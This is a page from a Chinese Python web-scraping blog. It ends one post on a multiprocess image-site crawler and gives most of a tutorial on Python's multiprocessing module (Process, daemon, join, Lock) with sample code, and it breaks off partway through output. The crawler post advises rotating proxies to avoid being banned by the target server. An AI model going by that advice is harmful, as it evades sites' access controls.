class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_crawler</span><span class="params">()</span>:</span></span><br><span class="line">    process = []</span><br><span class="line">    num_cpus = multiprocessing.cpu_count()</span><br><span class="line">    print(<span class="string">'将会启动进程数为：'</span>, num_cpus)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num_cpus):</span><br><span class="line">        p = multiprocessing.Process(target=mzitu_crawler) <span class="comment">##创建进程</span></span><br><span class="line">        p.start() <span class="comment">##启动进程</span></span><br><span class="line">        process.append(p) <span class="comment">##添加进进程队列</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> process:</span><br><span class="line">        p.join() <span class="comment">##等待进程队列里面的进程结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    process_crawler()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好啦！一个多进程多线的爬虫就完成了，（其实你可以设置一下 MongoDB，然后调整一下连接配置，在多台机器上跑哦！！嗯，就是超级简化版的分布式爬虫了，虽然很是简陋。） 本来还想下载图片那一块儿加上异步（毕竟下载图片是Ｉ＼Ｏ等待最久的时间了，），可惜异步我也没怎么整明白，就不拿出来贻笑大方了。 另外，各位小哥儿可以参考上面代码，单独处理图片地址试试（就是多个进程直接下载图片）？ 我测试了一下八分钟下载 100 套图 <em><strong>PS：请务必使用 第二篇博文中的下载模块，或者自己写一个自动更换代理的下载模块！！！不然寸步难行，分分钟被服务器 BAN 掉！</strong></em> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ图片20161102215153.jpg" alt="QQ图片20161102215153"></a>小白教程就到此结束了，后面我教大家玩玩 Scrapy；目标 顶点小说网， 爬完全站的小说。 再后面带大家玩玩 抓新浪 汤不热、模拟登录 之类的。或许维护一个公共代理 IP 池之类的。 这个所有代码我放在这个位置了：<a href="https://github.com/thsheep/mzitu/" target="_blank" rel="noopener">https://github.com/thsheep/mzitu/</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-20 18:33:20" itemprop="dateCreated datePublished" datetime="2016-11-20T18:33:20+08:00">2016-11-20</time>
                </span>
                <span id="/3363.html" class="post-meta-item leancloud_visitors" data-flag-title="小白爬虫第四弹之爬虫快跑（多进程+多线程）" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>6.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>6 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3335.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3335.html" class="post-title-link" itemprop="url">Python爬虫进阶六之多进程的用法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年最新-Python3-网络爬虫教程"><a href="#2022-年最新-Python3-网络爬虫教程" class="headerlink" title="2022 年最新 Python3 网络爬虫教程"></a>2022 年最新 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <p>如下为原文。</p>
                  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
                  <p>在上一节中介绍了 thread 多线程库。python 中的多线程其实并不是真正的多线程，并不能做到充分利用多核 CPU 资源。 如果想要充分利用，在 python 中大部分情况需要使用多进程，那么这个包就叫做 multiprocessing。 借助它，可以轻松完成从单进程到并发执行的转换。multiprocessing 支持子进程、通信和共享数据、执行不同形式的同步，提供了 Process、Queue、Pipe、Lock 等组件。 那么本节要介绍的内容有：</p>
                  <ul>
                    <li>Process</li>
                    <li>Lock</li>
                    <li>Semaphore</li>
                    <li>Queue</li>
                    <li>Pipe</li>
                    <li>Pool</li>
                  </ul>
                  <h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2>
                  <h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3>
                  <p>在 multiprocessing 中，每一个进程都用一个 Process 类来表示。首先看下它的 API</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="constructor">Process([<span class="params">group</span> [, <span class="params">target</span> [, <span class="params">name</span> [, <span class="params">args</span> [, <span class="params">kwargs</span>]]]]])</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <ul>
                    <li>target 表示调用对象，你可以传入方法的名字</li>
                    <li>args 表示被调用对象的位置参数元组，比如 target 是函数 a，他有两个参数 m，n，那么 args 就传入(m, n)即可</li>
                    <li>kwargs 表示调用对象的字典</li>
                    <li>name 是别名，相当于给这个进程取一个名字</li>
                    <li>group 分组，实际上不使用</li>
                  </ul>
                  <p>我们先用一个实例来感受一下：</p>
                  <figure class="highlight livecodeserver">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import multiprocessing</span><br><span class="line"></span><br><span class="line">def <span class="built_in">process</span>(<span class="built_in">num</span>):</span><br><span class="line">    print <span class="string">'Process:'</span>, <span class="built_in">num</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=<span class="built_in">process</span>, args=(i,))</span><br><span class="line">        p.<span class="built_in">start</span>()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最简单的创建 Process 的过程如上所示，target 传入函数名，args 是函数的参数，是元组的形式，如果只有一个参数，那就是长度为 1 的元组。 然后调用 start()方法即可启动多个进程了。 另外你还可以通过 cpu_count() 方法还有 active_children() 方法获取当前机器的 CPU 核心数量以及得到目前所有的运行的进程。 通过一个实例来感受一下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import multiprocessing</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def process(num):</span><br><span class="line">    time.sleep(num)</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">'Process:'</span>, num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(5):</span><br><span class="line">        p = multiprocessing.Process(<span class="attribute">target</span>=process, args=(i,))</span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'CPU number:'</span> + str(multiprocessing.cpu_count()))</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> multiprocessing.active_children():</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'Child process name: '</span> + p.name + <span class="string">' id: '</span> + str(p.pid))</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'Process Ended'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">Process:</span> <span class="number">0</span></span><br><span class="line"><span class="string">CPU</span> <span class="string">number:8</span></span><br><span class="line"><span class="attr">Child process name: Process-2 id:</span> <span class="number">9641</span></span><br><span class="line"><span class="attr">Child process name: Process-4 id:</span> <span class="number">9643</span></span><br><span class="line"><span class="attr">Child process name: Process-5 id:</span> <span class="number">9644</span></span><br><span class="line"><span class="attr">Child process name: Process-3 id:</span> <span class="number">9642</span></span><br><span class="line"><span class="string">Process</span> <span class="string">Ended</span></span><br><span class="line"><span class="attr">Process:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Process:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">Process:</span> <span class="number">3</span></span><br><span class="line"><span class="attr">Process:</span> <span class="number">4</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h3>
                  <p>另外你还可以继承 Process 类，自定义进程类，实现 run 方法即可。 用一个实例来感受一下：</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="title">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">MyProcess</span>(<span class="type">Process</span>):</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">loop</span>):</span></span><br><span class="line"><span class="class">        <span class="type">Process</span>.__init__(<span class="title">self</span>)</span></span><br><span class="line"><span class="class">        self.loop = loop</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        for count in range(<span class="title">self</span>.<span class="title">loop</span>):</span></span><br><span class="line"><span class="class">            time.sleep(1)</span></span><br><span class="line"><span class="class">            print('<span class="type">Pid</span>: ' + <span class="title">str</span>(<span class="title">self</span>.<span class="title">pid</span>) + ' <span class="type">LoopCount</span>: ' + str(<span class="title">count</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == '__main__':</span></span><br><span class="line"><span class="class">    for i in range(2, 5):</span></span><br><span class="line"><span class="class">        p = <span class="type">MyProcess</span>(<span class="title">i</span>)</span></span><br><span class="line"><span class="class">        p.start()</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在上面的例子中，我们继承了 Process 这个类，然后实现了 run 方法。打印出来了进程号和参数。 运行结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Pid: <span class="number">28116</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">28117</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">28118</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">28116</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">28117</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">28118</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">28117</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">28118</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">28118</span> LoopCount: <span class="number">3</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，三个进程分别打印出了 2、3、4 条结果。 我们可以把一些方法独立的写在每个类里封装好，等用的时候直接初始化一个类运行即可。</p>
                  <h3 id="deamon"><a href="#deamon" class="headerlink" title="deamon"></a>deamon</h3>
                  <p>在这里介绍一个属性，叫做 deamon。每个线程都可以单独设置它的属性，如果设置为 True，当父进程结束后，子进程会自动被终止。 用一个实例来感受一下，还是原来的例子，增加了 deamon 属性：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyProcess</span><span class="params">(Process)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, loop)</span>:</span></span><br><span class="line">        Process.__init__(self)</span><br><span class="line">        self.loop = loop</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> range(self.loop):</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">'Pid: '</span> + str(self.pid) + <span class="string">' LoopCount: '</span> + str(count))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">5</span>):</span><br><span class="line">        p = MyProcess(i)</span><br><span class="line">        p.daemon = <span class="literal">True</span></span><br><span class="line">        p.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Main process Ended!'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里，调用的时候增加了设置 deamon，最后的主进程（即父进程）打印输出了一句话。 运行结果：</p>
                  <figure class="highlight arduino">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Main <span class="built_in">process</span> Ended!</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>结果很简单，因为主进程没有做任何事情，直接输出一句话结束，所以在这时也直接终止了子进程的运行。 这样可以有效防止无控制地生成子进程。如果这样写了，你在关闭这个主程序运行时，就无需额外担心子进程有没有被关闭了。 不过这样并不是我们想要达到的效果呀，能不能让所有子进程都执行完了然后再结束呢？那当然是可以的，只需要加入 join()方法即可。</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="title">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">MyProcess</span>(<span class="type">Process</span>):</span></span><br><span class="line"><span class="class">    def __init__(<span class="title">self</span>, <span class="title">loop</span>):</span></span><br><span class="line"><span class="class">        <span class="type">Process</span>.__init__(<span class="title">self</span>)</span></span><br><span class="line"><span class="class">        self.loop = loop</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    def run(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        for count in range(<span class="title">self</span>.<span class="title">loop</span>):</span></span><br><span class="line"><span class="class">            time.sleep(1)</span></span><br><span class="line"><span class="class">            print('<span class="type">Pid</span>: ' + <span class="title">str</span>(<span class="title">self</span>.<span class="title">pid</span>) + ' <span class="type">LoopCount</span>: ' + str(<span class="title">count</span>))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">if __name__ == '__main__':</span></span><br><span class="line"><span class="class">    for i in range(2, 5):</span></span><br><span class="line"><span class="class">        p = <span class="type">MyProcess</span>(<span class="title">i</span>)</span></span><br><span class="line"><span class="class">        p.daemon = <span class="type">True</span></span></span><br><span class="line"><span class="class">        p.start()</span></span><br><span class="line"><span class="class">        p.join()</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    print '<span class="type">Main</span> process <span class="type">Ended</span>!'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里，每个子进程都调用了 join()方法，这样父进程（主进程）就会等待子进程执行完毕。 运行结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Pid: <span class="number">29902</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">29902</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">29905</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">29905</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">29905</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">29912</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">29912</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">29912</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">29912</span> LoopCount: <span class="number">3</span></span><br><span class="line">Main process Ended!</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>发现所有子进程都执行完毕之后，父进程最后打印出了结束的结果。</p>
                  <h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2>
                  <p>在上面的一些小实例中，你可能会遇到如下的运行结果： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161113-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/QQ20161113-0@2x-300x126.png" alt=""></a> 什么问题？有的输出错位了。这是由于并行导致的，两个进程同时进行了输出，结果第一个进程的换行没有来得及输出，第二个进程就输出了结果。所以导致这种排版的问题。 那这归根结底是因为线程同时资源（输出操作）而导致的。 那怎么来避免这种问题？那自然是在某一时间，只能一个进程输出，其他进程等待。等刚才那个进程输出完毕之后，另一个进程再进行输出。这种现象就叫做“互斥”。 我们可以通过 Lock 来实现，在一个进程输出时，加锁，其他进程等待。等此进程执行结束后，释放锁，其他进程可以进行输出。 我们现用一个实例来感受一下：</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from multiprocessing import Process, <span class="keyword">Lock</span></span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> MyProcess(Process):</span><br><span class="line">    <span class="keyword">def</span> __init__(<span class="keyword">self</span>, <span class="keyword">loop</span>, <span class="keyword">lock</span>):</span><br><span class="line">        Process.__init__(<span class="keyword">self</span>)</span><br><span class="line">        self.loop = <span class="keyword">loop</span></span><br><span class="line">        self.lock = <span class="keyword">lock</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> run(<span class="keyword">self</span>):</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">count</span> <span class="keyword">in</span> <span class="keyword">range</span>(self.loop):</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="comment">#self.lock.acquire()</span></span><br><span class="line">            print(<span class="string">'Pid: '</span> + <span class="keyword">str</span>(self.pid) + <span class="string">' LoopCount: '</span> + <span class="keyword">str</span>(<span class="keyword">count</span>))</span><br><span class="line">            <span class="comment">#self.lock.release()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">lock</span> = <span class="keyword">Lock</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>, <span class="number">15</span>):</span><br><span class="line">        p = MyProcess(i, <span class="keyword">lock</span>)</span><br><span class="line">        p.start()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先看一下不加锁的输出结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">0</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">1</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">2</span>Pid: <span class="number">45756</span> LoopCount: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">2</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">3</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">4</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">5</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">6</span>Pid: <span class="number">45755</span> LoopCount: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">6</span></span><br><span class="line">Pid: <span class="number">45755</span> LoopCount: <span class="number">7</span>Pid: <span class="number">45756</span> LoopCount: <span class="number">7</span></span><br><span class="line"></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45759</span> LoopCount: <span class="number">7</span></span><br><span class="line">Pid: <span class="number">45756</span> LoopCount: <span class="number">8</span>Pid: <span class="number">45755</span> LoopCount: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Pid: <span class="number">45757</span> LoopCount: <span class="number">8</span></span><br><span class="line">Pid: <span class="number">45758</span> LoopCount: <span class="number">8</span>Pid: <span 